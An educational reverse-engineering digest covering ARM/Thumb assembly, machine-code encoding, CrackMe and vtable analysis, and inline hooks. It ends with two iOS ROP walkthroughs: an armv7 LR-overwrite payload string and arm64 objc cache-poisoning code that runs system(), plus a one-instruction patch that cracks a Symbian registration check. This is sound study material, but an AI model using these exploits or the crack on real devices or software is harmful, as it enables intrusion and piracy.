# ARM/ARM64 Assembly Reverse Engineering and ROP in Practice

> Positioning: practical knowledge distilled from 16 Kanxue ARM posts — ARM/Thumb instruction essentials, hand-encoding machine code, CrackMe assembly-analysis patterns, the assembly layer of C++ virtual functions and inline hooks, and two full iOS armv7/arm64 ROP cases. The NOP byte table and the arm64 branch encodings live in `../../techniques/16-quick-ref/quick-reference.md` and are not repeated here.

---

## §1 ARM/Thumb instruction essentials cheat sheet (the four basics posts merged)

> Merged sources: Introduction to ARM Assembly (ljcnaix), The ARM Instruction Set (ljcnaix), Introduction to ARM Assembly (II): The ARM Instruction Set (amzilun), Introduction to ARM Instructions (dig_grave)

### 1.1 State and switching

- In ARM state instructions are fixed 32-bit; Thumb is 16-bit, Thumb-2 can be 32-bit (the `.w` suffix); state is independent of privilege level.
- Switching: (1) `BX/BLX reg` with the target's bit0=1 (e.g. 0x5530+1); (2) the CPSR T bit=1. In ARM state every instruction is conditional; Thumb-2 uses IT. When writing shellcode, use 16-bit Thumb instead of 32-bit ARM to cut down `\0` truncation.

### 1.2 Registers and the PC pipeline offset (a high-frequency reversing trap)

| Register | Alias | Role | x86 counterpart |
|---|---|---|---|
| R0-R3 | - | General purpose; **the first 4 function arguments** | EAX/EBX/ECX/EDX |
| R4-R10 | - | General purpose (callee-saved) | ESI/EDI etc. |
| R7 | - | **The syscall number** (Linux); often the FP under Thumb | - |
| R11 | FP | Frame pointer | EBP |
| R12 | IP | Intra-procedure scratch | - |
| R13 | SP | Stack pointer | ESP |
| R14 | LR | Return address | - |
| R15 | PC | Program counter | EIP |
| CPSR | - | Status flags N/Z/C/V/E/T/M | EFLAGS |

**The PC trap**: reading PC directly: ARM state = current instruction + 8, Thumb state = +4 (the pipeline prefetches ahead; measured `mov r0,pc` at 0x10054 -> R0=0x1005C). `ADD Rx,PC,Ry` relative addressing and computing literal-pool positions must use +8/+4, otherwise you are off by 2 instructions.

### 1.3 Instruction templates and the second operand

- Template `MNEMONIC{S}{condition} {Rd}, Operand1, Operand2`; `{S}` updates the CPSR from the result (the precondition for compare/conditional execution), `{condition}` defaults to AL, the flag combination is checked before execution.
- Operand2 flexible forms: `#123` (value-restricted, see 1.6) / `Rx` / `Rx, LSL|LSR|ASR|ROR n or RRX`. The barrel shader merges two instructions into one: `MOV R1,R0,LSL#1` = R1=R0*2, saving a multiply.

### 1.4 The common-instruction table (reversing-oriented)

| Instruction | Description | Instruction | Description |
|---|---|---|---|
| MOV/MVN | Move/move-negated | LDR/STR | Load/store |
| ADD/SUB/RSB | Add/subtract/reverse-subtract (RSB Rd,Rn,Rm means Rd=Rm-Rn) | LDM/STM | Multiple-register load/store |
| MUL | Multiply | PUSH/POP | Push/pop |
| EOR/AND/ORR | Bitwise ops | B/BL | Branch/branch-with-link (LR=PC+4) |
| CMP/TST | Compare (subtract/AND, flags only) | BX/BLX | Branch with state switch |
| LSL/LSR/ASR/ROR | Shifts | SWI/SVC | Syscall |
| SMULL/UMULL | 64-bit signed/unsigned multiply (the key to division optimization) | - | - |

### 1.5 load/store addressing (3 offset forms x 3 addressing modes)

- Offset forms: immediate `[Rb,#imm]`, register `[Rb,Rc]`, scaled register `[Rb,Rc,LSL#2]` (a common array-walk idiom); in `[Rx]` the register value inside the brackets = the memory address being accessed.

| Addressing mode | Syntax | Behavior |
|---|---|---|
| Offset | `STR R2, [R1, #2]` | Accesses R1+2, base unchanged |
| Pre-indexed | `STR R2, [R1, #4]!` | Accesses R1+4, **the base becomes R1+4** |
| Post-indexed | `LDR R3, [R1], #4` | Accesses R1 first, **then R1=R1+4** |

- String/constant addressing: `LDR R0,=(label-current instruction address)` then `ADD R0,PC,R0` yields the absolute address (position independent); after compilation it often becomes `LDR R4,[PC,R4]` (the literal pool; compute the pool address with PC+8). Bulk moves lean on the `!` writeback to save an ADD: `LDMIA R3!,{R0-R2}` leaves R3+0xC after the loads and `STMIA R12!,{R0-R3}` leaves R12+0x10 after the stores; with the IA/IB/DA/DB suffixes, when decrementing **the register list maps in reverse** (the lowest address = the lowest number).
- Width suffixes: `STRH/STRB` store a halfword/byte; `LDRB/LDRH/LDRSH/LDRSB` load signed or unsigned.

### 1.6 Immediate-encoding limits (must-read for patching/hand-written shellcode)

The 12-bit immediate = an 8-bit n (0-255) + a 4-bit rotation r: `v = n ROR 2r`. **Only values obtainable by rotating one byte right by an even number of bits are legal.**

- Legal: `#256` (1 ror 24), `#0x06000000` (6 ror 8). Illegal: `#370` (185 ror 31, out of range), `#511` (the bit pattern exceeds one byte), `#0x06010000`.
- Workarounds: (1) split it — `MOV R0,#256; ADD R0,#255`; (2) the pseudo-instruction `LDR R1,=511` (the assembler turns it into a MOV or drops it into the literal pool). The judging script rotator.py (copy as-is):
```python
ror = lambda val, r, m=32: ((val & (2**m-1)) >> r % m) | (val << (m-(r % m)) & (2**m-1))
def check_immediate(x):
    for n in range(1, 256):
        for i in range(0, 31, 2):
            if ror(n, i) == x: return True, n, i
    return False, None, None
```

### 1.7 Condition codes + the IT instruction

- Common condition codes: EQ(Z=1)/NE(Z=0), GT(Z=0&&N=V)/LT(N!=V)/GE(N=V)/LE(Z=1||N!=V), HS(C=1)/LO(C=0), HI(C=1&&Z=0), MI(N=1)/PL(N=0), VS/VC (overflow), AL. Thumb-2 uses IT blocks: `IT{x{y{z}}} cond` governs up to 4 instructions; inside the block the condition suffixes must match the condition or its logical inverse, and a branch may only be the last instruction. Example: `ITTE NE` + `ANDNE R0,R0,R1` (Then) + `ADDSNE R2,R2,#1` (Then) + `MOVEQ R2,R3` (Else).
- The ARM->Thumb switching template: under `.code 32`, `ADD R3,PC,#1` (set bit0) + `BX R3`, then write Thumb under `.code 16`.

### 1.8 Stack types and PUSH/POP

Reversing only ever sees FD (full descending, the ARM/AAPCS default): `STMFD`=PUSH, `LDMFD`=POP (FA/ED/EA, see the instruction manual). PUSH: SP-=4 then write; POP: read then SP+=4.

---

## §2 Thumb address alignment and debugger pitfalls

### On function run-address alignment under thumb2 instructions, with firmware-analysis verification
Author: 不爱榴莲吖

- Symptom: STM32 (Cortex-M3) firmware function addresses are odd (`08000BB1`, `080002D9`). With ARM 4-byte / Thumb 2-byte alignment the low bit must be 0 — **the low bit is repurposed to encode state**: a function pointer with bit0=1 means Thumb state; the compiler stores "real address + 1" into ROM (at 0x08000BC4 you read 0x080002D9 = 0x080002D8+1). Cortex-M reset: the word at 0x0 goes to SP, at 0x4 to PC (Reset_Handler).
- When IDA loads such a bin, set the ROM/RAM bases by hand; when analyzing jump/function tables, strip bit0 first, then compute the real address.

### Fixing Thumb disassembly in lldb 310 and later
Author: Isaiah

- Symptom: ARMv7s + Thumb2 + no symbols; lldb-310+ cannot disassemble Thumb correctly (300 could). Root cause: lldb uses MachO FunctionStarts to decide the instruction set per address and defaults to ARM state when no symbol is found; 310's `ClearModules` accidentally wipes the section table (`m_section_load_history.Clear()`), the query returns -1 unchecked, and the symbol information is lost.
- Fix: patch `Target::SetExecutableModule`, commenting out `ClearModules(false)` and `m_section_load_history.Clear()`. Lesson: when stripped Thumb disassembly goes wrong, suspect the symbol/section path first — not necessarily the code itself.

---

## §3 Machine-code encoding and hand computation

### Computing thumb2 BL / BLX instruction machine code
Author: cacorothuo

- BL/BLX are 32-bit Thumb instructions (two halfwords), **the high halfword comes second** (in a little-endian file, low first). Decoding (to get the target address): the low 11 bits of the high halfword H = offset_high, the low 11 bits of the low halfword L = offset_low; `offset=(offset_high<<12)|(offset_low<<1)`; the sign bit (bit 25) 0 -> forward, `dst=srcPC+4+offset`; 1 -> backward (negate-plus-one for negative), `dst=srcPC+4-|offset|`. Uses: patching jumps/inline calls straight from the formula without the manual; hand-verifying disassembler output.
```
0012  00F0 01F8  bl .Lhelo       ; H=f000→000,L=f801→001;(000<<12)|(001<<1)=2 → 0x12+4+2=0x18 ✓
00001164  F7FF FFBE  bl _Z4testv ; H=f7ff→7ff,L=ffbe→7be;(7ff<<12)|(7be<<1)=7fff7c 符号位1 → 取 0x84;0x1164+4-0x84=0x10e4 ✓
```
- Encoding (assembly -> machine code, copy as-is):
```c
// BL <label>
offset = dstAddr - srcAddr;
offset = (offset - 4) & 0x007fffff;
high = offset >> 12;  low = (offset & 0x00000fff) >> 1;
machineCode = ((0xFF00 | low) << 16) | (0xF000 | high);
// BLX <label>:low 奇数先 +1(目标 4 字节对齐),魔数 0xFF00 改 0xEF00,其余同上
```

### A tool for converting arm instructions to machine code
Author: kuty

Skip the encoding tables and borrow the GCC cross-assembler: write a one-line `.s`, assemble to `.o`, read the machine code (the original tool supports thumb/arm/aarch64 mnemonic -> machine-code lookup). A self-built pipeline:
```bash
echo 'ldr.w pc,[pc,#0]' > t.s
arm-linux-gnueabi-as -mthumb t.s -o t.o && arm-linux-gnueabi-objdump -d t.o   # 或 objcopy -O binary + xxd
```

The fastest way to fill exploit bytes, craft junk instructions, and verify hand-computed encodings.

---

## §4 CrackMe assembly analysis in practice

### Analysis of the first ARM-assembly CrackMe
Author: Speeday

A 32-bit ARM ELF CrackMe; `main(argc,argv)` strcmps argv[1] against a computed result. Recognition patterns:

- Entry: `STMFD SP!,{R4-R8,LR}` saves the scene; `SUB SP,SP,#0x48` opens local space; string addressing via `LDR R3,=(str-off); ADD R3,PC,R3` (PC-relative). Bulk data movement with `LDMIA!/STMIA!` hand-offs + `STR/STRH/STRB` word/halfword/byte packing (the patterns of 1.5).
- Stack canary: `LDR R4,[PC,R4]` (the off_AFAC function pointer) -> `LDR LR,[R4]` -> `STR LR,[SP,#0x44]`, verified by `CMP` before exit. The core algorithm (compiler-optimization spots):
```asm
loc_8588:
LDR     R1, [R3]          ; 取 keys[i]
LDRB    R12, [R0,#1]!     ; 取 name[i](前索引写回)
EOR     R1, R1, #7        ; keys[i]^=7
SMULL   R8, R7, R2, R1    ; 除法变乘法:R2=0x2AAAAAAB
SUB     R1, R7, R1,ASR#31 ; 符号修正:(R1*魔数>>32)-(R1>>31)
SUB     R1, R1, #2        ; 源码 +22-24 合并为 -2
EOR     R1, R1, R12       ; ^name[i]
STR     R1, [R3],#4       ; 存回,后索引
CMP     R3, R5
BNE     loc_8588
```
- **Division by 6 without a divide**: multiply by the magic 0x2AAAAAAB and take the high 32 bits, then subtract the `ASR#31` correction; the recognition signature = SMULL/UMULL + 0x2AAAAAAB (for /6), 0xCCCCCCCD (for /10) — see the magic number and you restore the division.
- The source's `+=22;-=24` was merged into `SUB #2` — restore via the equivalent expression, don't match line by line. The second round's byte packing: `LDR R1,[R3,#4]!` pre-indexed load, `STRB R1,[R2,#1]!` store, with `\0` appended at the end; the comparison `BL _strcmp; CMP R0,#0; BEQ success`.
- Corresponding source: `keys[]={0xb,0x1f,0x19,0x19,0x49,0xb,0xb,0xb,0x31,0x53}` looping `keys[i]^=7; /=6; -=2; ^=name[i]` (name="helloworld").

### Analysis of a second ARM-assembly program
Author: Speeday

An Android so (a modified HelloJNI), covering the full set of for/while/switch/subroutine-call structures.

- **The divide-by-10 modulo pattern** (the UMULL flavor): `LDR R4,=0xCCCCCCCD` (the /10 magic) -> `MOV R3,R3,LSR#2` -> `UMULL R5,R1,R4,R3` (the high 32 bits land in R1) -> `MOV R1,R1,LSR#3` gives the quotient -> `MUL R1,R12,R1` (quotient*10) -> `RSB R1,R1,R3` gives the remainder (name[i]%10) -> `AND R1,R1,#0xFF`. Check with a=16: the high bits C>>3=1, 1*10=10, 16-10=6=16%10, correct.
- **Conditional instructions merging if/else**: the source's `%2==0 ? +10 : +5` compiles into a uniform `SUB R1,R2,#0x14` (-20) first, `TST R1,#1` tests the low bit, then `SUBEQ R2,R2,#0xA` (even) / `SUBNE R2,R2,#0xF` (odd) — restore by combining "the common amount subtracted early" with "the conditional increment" (+/-10 and +/-5 correspond to -0xA/-0xF).
- **The switch jump table (the ARM flavor)**: after `CMP R1,#8`, `ADDLS PC,PC,R1,LSL#2` — the immediately following B-instruction table (4 bytes per entry, e.g. `loc_CBC: B loc_D30` = case 0) dispatches by case index, and `LS` doubles as the bounds check (out of range falls through to default `B loc_D38`); each case body is a single `MOV R3,#imm; B common-exit`.
- **The JNI exit**: `LDR R3,[R5]; LDR R3,[R3,#JNINativeInterface.NewStringUTF]; BLX R3` (an indirect call through the JNIEnv function table, with a state switch).
- **Remote-debugging the so**: `adb shell /data/local/tmp/android_server` -> `adb forward tcp:23946 tcp:23946` -> attach with IDA, Ctrl+S to find the so base; the breakpoint = base + static offset (0x491dc000+0xbc4=0x491dcbc4).

### The crack process of an ARM-instruction-set target (Symbian)
Author: 黑手K9998

A Symbian S60 (in IDA pick PDAs/Handhelds/Phones -> Symbian EPOC, load the SIS) registration analysis:

- The registration code is bound to the IMEI: locate `BL PlpVariant::GetMachineIdL(TBuf<128>&)`, then `TDesC16::AtC`/`LDRH R0,[R0]` pulls characters one by one. Loop essentials: `SUB R0,R7,#5; CMP R0,#4; BLS loc_DE6` (i<5 or >9 skips the weighting, only some digits are processed); `LDR R4,=0x30B` (weight 779) accumulates; `LSL R0,R0,#1` (ASCII*2) gets added in; `CMP R7,#0xE; BLE` loops 14 times (the IMEI digit count). Simulate the R5 accumulation round by round in a hex calculator to obtain the registration code.
- **The crack point**: at `.text:10000DEC`, changing `ADD R0,R5,#0` to `MOV R0,#0` makes "0" always correct — once the algorithm is pinned down, patching one instruction decides life or death.

---

## §5 A GNU ARM assembly stack experiment

### A demonstration of GNU ARM assembly stack operations
Author: yjmwxwx

`.thumb + .syntax unified`, a complete bare-metal Cortex-M stack round-trip (copy as-is; the vector table: `.word stack-top+1`, `.word start+1` — the SP bit-field forces alignment so bit0 is irrelevant there, and the entry +1 means Thumb state):
```asm
duizhanshiyan:
    push {r0-r12,lr}           @ 13 字压栈
    mov  r7, sp                @ 备份栈帧基址(Thumb 无 FP 惯例时手动)
    sub  sp, #0x30             @ 开 0x30 局部变量区
    # (省略:r0-r12 置新值后 str rN,[sp,#0x04*i] 逐槽放变量)
    add  sp, #0x30             @ 丢弃变量区,回到压栈后顶
    # (省略:倒序覆写原 R0-R12 槽)
    mov  sp, r7                @ 恢复栈帧
    pop  {r0-r12,pc}           @ 弹回并返回(pop pc = 返回)
```
- Manual frames: `mov r7,sp` saves the base and `mov sp,r7` restores it before returning — in reversing, seeing "sp stored into some register and then written back" means a manually opened/closed stack frame. `pop {…,pc}` is the standard Thumb return when there is no `pop lr` semantics; large scenes restore symmetrically with `push {r0-r12,lr}`/`pop {r0-r12,pc}`.

---

## §6 The assembly-level implementation of C++ virtual functions

### Understanding the Android C++ virtual-function implementation from ARM assembly
Author: ManyFace (thread: MindStorm)

- **Single class**: the object = a vtable pointer (4B) + fields; the constructor writes the vtable first, then runs the body. Calling `baseA->baseA_virtual_2()` becomes `(*(*v0+4))(v0)`: load the object head -> vtable[1] -> call with the object pointer as argument 0. **Instance-method argument 0 is always this**.
- **Single inheritance**: without overrides the child object = the parent part (parent vptr + parent fields) + child fields; the child constructor runs the parent constructor first (writing the parent vtable) **then overwrites it with the child vtable**; the child vtable = the parent's virtual-function addresses up front + the child's new ones behind; with overrides, the overridden slot is swapped for the child function while the rest stay put — polymorphism = slot swapping.
- **Multiple inheritance**: the object = n*(vptr + parent fields) + child fields, laid out in declaration order, one vptr per parent. Calling the second parent's virtual function `(*(v0[2]+8))(v0+2)` — **this must be offset**, passing the parent sub-object base rather than the object head; the child's virtual functions hang after the first parent's vtable; explicitly scoped calls (`subClass->BaseA::virtual_1()`) are resolved at compile time and skip the vtable. Multiple inheritance + override: **every** overridden slot in each parent's vtable must be swapped, and an overridden function of a non-first parent gets an extra copy placed in the child virtual-function area in declaration order (so a child pointer can call it directly); a non-first parent's vtable is preceded by a `0xFFFFFFF8/0xFFFFFFF0` (negative offsets -8/-16) thunk that adjusts this.
- Reversing recognition: the object's malloc size = 4 x (number of parents) + the field sum; the constructor's "parent constructor first, then write the vptr" double write; call sites take the vtable from `[obj+k*4]`, the slot from `+offset`, and this from `(obj+k*4)` — three steps to reconstruct the class hierarchy.

---

## §7 The assembly level of inlinehook

### Understanding inlinehook at the ARM assembly level
Author: 唱过阡陌

An Android thumb so inlinehook, before/after (measured):

- The hook = **replacing the target function's first 4 thumb instructions (8 bytes)** with one 32-bit Thumb jump `DF F8 00 F0` = `ldr.w pc,[pc,#0]`: load the target from the 4-byte address slot immediately following into PC (under the three-stage pipeline, at decode time PC = the jump instruction's address). The 4 replaced original instructions are **relocated to the head of the new function** and execute first (preserving the scene/register state), then the new logic takes over.
- Calling back into the original function: the framework dynamically generates a trampoline whose core is **modifying the already-pushed LR** — when the old function's `pop {pc}` fires, it returns to "the instruction after the new function's call into the old function" rather than the original caller; the new function returns via a standard epilogue (`pop {r4-r7,pc}`) to the original caller.
- Reversing recognition: a function head showing `DF F8 xx F0` (ldr.w pc,[pc,#imm]) or an abnormal jump such as `mov pc` followed by a data slot means it has been inlined; to restore the original logic, find the relocated head instructions (the framework dumps them at callback registration; search memory for the original machine code).

---

## §8 ROP principles and two iOS case studies

### ROP exploitation practice on iOS (an armv7 stack overflow)
Author: luoyanbei

A jailbroken iPhone4s on iOS7.1 (32-bit ARM); the bug = `char buff[12]` in main + `scanf("%s",buff)` with no length limit; secret() holds `system(command)`. Compiled with protections off: `-fno-pie -fno-stack-protector -mno-thumb` (needs the old 7.1 SDK; newer SDKs ban system()).

- **Locating the offset**: input `AAAABBBB…EEEEFFFF` and crash, then read the register scene from `/var/Logs/CrashReporter`: r7=0x45454545, pc=0x46464644 -> buff->r7 is 20 bytes -> the next 4 bytes is the LR slot. **An ARM stack overflow hijacks LR: main's return `pop {r7,pc}` feeds PC**; the crash log = a free offset prober (no cyclic needed).
- **Stage one (a single function)**: `printf "AAAABBBBCCCCDDDDEEEE\x64\xbe\x00\x00" | ./roplevel` — change()'s address 0xbe64 (from gdb `disas change`) written little-endian into the LR slot; after the output, Bus error (the chain is not closed).
- **Stage two (chained, the core trick)**: change()'s prologue is `push {r7,lr}` and its epilogue `pop {r7,pc}` — **make LR point to change+4 to skip the push** (semantics preserved, `mov r7,sp` runs as usual); the epilogue's pop consumes the next two 4-byte words from main's stack: the first into r7 (garbage), the second into pc -> secret():
```
AAAABBBBCCCCDDDDEEEE\x68\xbe\x00\x00FFFF\xa8\xbe\x00\x00
                      └ change+4 ┘    └r7┘ └ secret=0xbea8 ┘
```

Key takeaway: on armv7, with no gadget library, the simplest chain = overwrite LR -> target function + 4 (skip the push) -> lay out [garbage r7][next target] on the stack; each function in the chain eats more stack, aligned at 4 bytes.

### ROP practice on iOS_arm64: executing a system command with a gadget
Author: luoyanbei

A jailbroken iPhone5s on iOS8.4 (arm64), ASLR+DEP+PIE all on, but **dyld_shared_cache(/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64) sits at a fixed address after boot and is identical across all processes** — the gadget library comes from there. Flow:

1. Export dyld_shared_cache_arm64 -> pull out CoreFoundation; ROPgadget picks `0x181ccef6c : ldr x1, [x0, #0x98] ; ldr x0, [x0, #0x70] ; cbz x1, #0x181ccef88 ; br x1`; IDA computes the offset `0x181ccef6c - CoreFoundation base (0x181BF0000) = 0xDEF6C`; the true runtime address = `find_library_load_address("CoreFoundation")+0xDEF6C`.
2. **Forge an objc object per the gadget's assembly** (each `ldr xN,[x0,#imm]` maps to one `+imm` field in the struct, padded to size):
```objc
struct fake_receiver_t {
    uint64_t fake_objc_class_ptr;   // +0x00 类指针
    uint8_t  pad1[0x70-0x8];
    uint64_t x0;                    // +0x70 ← ldr x0,[x0,#0x70] 取到,做 system 参数
    uint8_t  pad2[0x98-0x70-0x8];
    uint64_t x1;                    // +0x98 ← ldr x1,[x0,#0x98] 取到,br x1 跳这
    char     cmd[1024];
} fake_receiver;  // 另配 fake_objc_class_t{pad[0x10];cache_buckets_ptr→bucket;mask} + fake_cache_bucket_t{cached_sel; cached_function→gadget}
```
3. Trigger (objc_msgSend walks into the gadget on a cache hit):
```objc
fake_cache_bucket.cached_sel      = (void*)NSSelectorFromString(@"release");
fake_cache_bucket.cached_function = (void*)(base + 0xDEF6C);   // gadget
fake_receiver.x0 = (uint64_t)&fake_receiver.cmd;               // system 参数
fake_receiver.x1 = (void*)dlsym(RTLD_DEFAULT, "system");       // br x1 目标
strcpy(fake_receiver.cmd, "touch /tmp/IceAndFire");
# (省略:fake_objc_class/fake_receiver 各指针接线)
[talker release];
```

Key takeaway: on arm64 there is no push-lr-style simple chain; switch to **objc cache poisoning + a single-gadget relay** — a gadget shaped like `ldr x1,[x0,#imm]; ldr x0,[x0,#imm2]; br x1` is naturally a "parameter loader + jumper": x0 (the argument) and x1 (the target function) both become fields of the forged object, and one `br` completes the system call; the offsets must be computed against the same-version library **extracted on the target device** (the shared_cache varies with the system version); beating PIE = the shared_cache's fixed address + a runtime `find_library_load_address`/`dlsym` for the true base.
